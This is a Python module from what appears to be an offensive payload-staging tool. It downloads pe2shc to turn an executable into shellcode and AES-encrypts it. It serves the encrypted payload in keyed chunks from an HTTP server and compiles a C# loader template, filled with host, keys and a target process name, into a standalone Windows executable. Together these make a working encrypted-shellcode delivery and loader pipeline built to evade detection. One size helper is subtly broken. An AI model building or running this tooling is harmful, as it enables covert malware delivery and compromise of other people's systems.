import os, platform, subprocess
import requests
from rich.table import Table
from rich.console import Console
from pathlib import Path
import pip
from http.server import BaseHTTPRequestHandler, HTTPServer
import secrets
import re
import shutil


def generate_random_key(length):
    # Generate a random key of specified length in bytes
    key = secrets.token_bytes(length)
    return key.hex()  # Convert to hexadecimal string for readability


class RequestHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, data=None, key=None, **kwargs):
        self.data = data
        self.key = key
        super().__init__(*args, **kwargs)

    def do_GET(self):
        # Check if the request is to exit
        exit_request = str(self.headers.get("Terminate-Server", "False"))
        if exit_request == "True":
            # Send shutdown response
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Server is shutting down...")
            shutil.rmtree(os.path.abspath(os.path.join(os.path.dirname(__file__), "files")))
            shutil.rmtree(os.path.abspath(os.path.join(os.path.dirname(__file__), "payload", "loader")))
            
            exit()

        # Extract headers for starting and ending index
        end_index = str(self.headers.get("Ending-Index", 10000))
        start_index = int(self.headers.get("Starting-Index", 0))
        end_index = int(self.headers.get("Ending-Index", 10000))
        key = str(self.headers.get("Communication-Key"))

        # Check if the provided key matches the expected key
        if key != self.key:
            self.send_response(403)  # Forbidden
            self.end_headers()
            self.wfile.write(b"")
            return

        # Extract the requested chunk
        chunk = self.data[start_index:end_index]
        # Send headers with payload size
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Size-of-Payload", str(len(self.data)))
        self.end_headers()

        # Send the data chunk
        self.wfile.write(chunk)


def run_server(
    file_path,
    server_class=HTTPServer,
    handler_class=RequestHandler,
    host="0.0.0.0",
    port=8080,
    key=None,
):

    # Read the entire file into memory
    with open(file_path, "rb") as file:  # Open in binary mode
        data = file.read()

    # Log the size of the file
    print(f"[#] File size being served: {len(data)} bytes")

    server_address = (host, port)
    httpd = server_class(
        server_address,
        lambda *args, **kwargs: handler_class(*args, data=data, key=key, **kwargs),
    )
    print(f"[#] Starting httpd on port {port}...")
    httpd.serve_forever()


def aes_encryption_handler(file_path):
    output_path = os.path.join(os.path.dirname(__file__), "files", "payload.enc")
    aes_encrypt_path = os.path.join(
        os.path.dirname(__file__), "bin", "AesEncrypt", "AesEncrypt.exe"
    )

    # Command to run the AES encryption tool
    command = f"{aes_encrypt_path} {file_path} {output_path}"

    # Use subprocess to execute the command and capture stdout and stderr
    process = subprocess.Popen(
        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
    )

    # Capture and store the command output
    output = []
    for line in process.stdout:
        decoded_line = line.decode("utf-8")
        print(decoded_line, end="")  # Print to terminal
        output.append(decoded_line)  # Store in variable

    # Wait for the process to finish
    process.wait()

    # In case of errors, print the stderr
    if process.returncode != 0:
        error_output = process.stderr.read().decode("utf-8")
        print(f"Error: {error_output}")
        output.append(error_output)

    # Convert output list to a single string
    full_output = "".join(output)

    # Use regex to extract the IV and Key from the output
    iv_match = re.search(r"IV:\s*([A-F0-9]+)", full_output)
    key_match = re.search(r"Key:\s*([A-F0-9]+)", full_output)

    if iv_match and key_match:
        iv = iv_match.group(1)
        key = key_match.group(1)
        return iv, key
    else:
        print("IV or Key not found in the output.")
        return None, None

def create_loader():
    cwd = os.getcwd()
    if not os.path.exists(os.path.join(cwd, "payload")):
        os.mkdir(os.path.join(cwd, "payload"))
    os.chdir(os.path.join(cwd, "payload"))
    try:
        subprocess.run(
            ["dotnet", "new", "console", "-n", "loader", "--force"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=False,
            check=True,
        )
    except subprocess.CalledProcessError as e:
        print(f"Error while creating payload loader: {e.stderr}")

def template_compile(template_file, host, commKey, ivHex, keyHex, process_name):

    create_loader()
    # Path to the C# template and output files
    output_file = os.path.join(os.getcwd(), "loader", "Program.cs")

    # Read the C# template
    with open(template_file, "r") as file:
        csharp_code = file.read()

    # Replace placeholders with actual values
    csharp_code = csharp_code.replace("{HOST}", host)
    csharp_code = csharp_code.replace("{COMM_KEY}", commKey)
    csharp_code = csharp_code.replace("{IV_HEX}", ivHex)
    csharp_code = csharp_code.replace("{KEY_HEX}", keyHex)
    csharp_code = csharp_code.replace("{PROC_NAME}", process_name)

    # Write the updated C# code to a new file
    with open(output_file, "w") as file:
        file.write(csharp_code)

    # Save the current working directory
    original_dir = os.getcwd()

    # Navigate to the target directory
    os.chdir(os.path.join(os.getcwd(), "loader"))

    # Execute the dotnet publish command
    command = [
        "dotnet",
        "publish",
        "-c",
        "Release",
        "-r",
        "win-x64",
        "--self-contained",
        "true",
        "-p:PublishSingleFile=true",
        "-p:PublishReadyToRun=true",
        "-p:PublishTrimmed=true",
    ]

    # Run the command and capture the output
    output = subprocess.run(command, capture_output=True, text=True)
    path_pattern = re.compile(r'[A-Za-z]:\\(?:[^\\\/:*?"<>|\r\n]+\\)*')
    matched_path = path_pattern.search(output.stdout.strip().split("\n")[-1])

    # Change to original dir
    os.chdir(original_dir)

    return matched_path.group() + "loader.exe"


def setup_req():
    bin_directory = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bin")

    # Download pe2shc.exe by hasherezade
    print("[#] Downloading pe2shc by hasherezade ... ", end="")
    if not os.path.exists(os.path.join(bin_directory, "pe2shc.exe")):
        download_pe2shc(bin_directory)
    print("[+] DONE !")

    # Installing python modules
    print("[#] Installing python modules... ", end="")
    # Redirect stdout and stderr
    import io, sys

    original_stdout = sys.stdout
    original_stderr = sys.stderr
    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()

    requirements_path = os.path.join(os.path.dirname(__file__), "requirements.txt")
    try:
        pip.main(["install", "-r", requirements_path])
    except Exception as e:
        print(f"Error occurred while installing packages: {e}")
    finally:
        # Restore stdout and stderr
        sys.stdout = original_stdout
        sys.stderr = original_stderr
    print("[+] DONE !")


def print_config(host, port, payload_file):
    # Initialize console and table from rich
    console = Console()
    table = Table()

    # Add columns
    table.add_column("Configuration", justify="left", style="bold green", no_wrap=True)
    table.add_column("Value", justify="left", style="bold blue")

    # Add rows
    table.add_row("Payload File", payload_file)
    table.add_row("Host", host)
    table.add_row("Port", str(port))

    # Print the table
    console.print(table)


def to_bin(payload_file):
    print(f"[i] Converting payload to shellcode... ", end="")
    # Construct path to files
    pe2shc_path = Path(__file__).resolve().parent / "bin" / "pe2shc.exe"
    bin_output = Path(__file__).resolve().parent / "files" / "payload.bin"
    # Converting payload file to shellcode
    os.system(
        f"{pe2shc_path} {payload_file} {bin_output} > {'NUL' if platform.system() == 'Windows' else '/dev/null'} 2>&1"
    )
    print("[+] DONE !")


def download_pe2shc(output_directory: str):
    # Fetch the latest release data
    try:
        response = requests.get(
            "https://api.github.com/repos/hasherezade/pe_to_shellcode/releases/latest"
        )
        response.raise_for_status()  # Ensure the request was successful
        release_data = response.json()

        # Find the asset 'pe2shc.exe' and download it
        asset_url = next(
            (
                asset["browser_download_url"]
                for asset in release_data["assets"]
                if asset["name"] == "pe2shc.exe"
            ),
            None,
        )

        if not asset_url:
            raise ValueError("[x] pe2shc.exe not found in the release assets.")
        os.system(
            f"curl -L -o {os.path.join(output_directory, "pe2shc.exe")} {asset_url} > {'NUL' if platform.system() == 'Windows' else '/dev/null'} 2>&1"
        )
    except Exception as e:
        raise RuntimeError(f"\n[x] Failed to download pe2shc binary: {e}")


def get_size(file_path: str) -> str:
    """
    Returns the human-readable size of a file.
    Args:
        file_path (str): Path to the file.
    Returns:
        str: Human-readable size of the file.
    """
    try:
        size = os.path.getsize(file_path)
        for unit in ["bytes", "KB", "MB", "GB"]:
            if size < 1024:
                return f"{size:.2f} {unit}"
    except FileNotFoundError:
        raise FileNotFoundError(f"[#] File '{file_path}' not found.")
    except PermissionError:
        raise PermissionError(f"[#] Permission denied: '{file_path}'")


def to_hex(file_path: str) -> str:
    """
    Converts a binary file to a hexadecimal string.

    Args:
        file_path (str): Path to the binary file.

    Returns:
        str: A hexadecimal string representing the binary file's contents.

    Raises:
        FileNotFoundError: If the specified file is not found.
        PermissionError: If there is a permission issue accessing the file.
    """
    try:
        with open(file_path, "rb") as file:
            bytesread = file.read()

        # Format the bytes into a C-style char array
        # bytes_string_final = ", ".join(f"0x{byte:02X}" for byte in bytesread)
        bytes_string_final = "".join(f"{byte:02X}" for byte in bytesread)
        return bytes_string_final

    except FileNotFoundError:
        raise FileNotFoundError(f"[#] Error: Binary file '{file_path}' not found.")
    except PermissionError:
        raise PermissionError(f"[#] Permission denied: '{file_path}'")
    except Exception as e:
        raise RuntimeError(f"[#] An unexpected error occurred: {e}")


def write_file(file_path: str, contents: str):
    """
    Writes the contents to the file.
    Args:
        file_path (str): Path to the file.
        contents (str): Contents to write to the file.
    """
    try:
        with open(file_path, "w") as f:
            f.write(contents)
    except OSError as e:
        print(f"[#] Error writing to file '{file_path}': {e}")
        raise
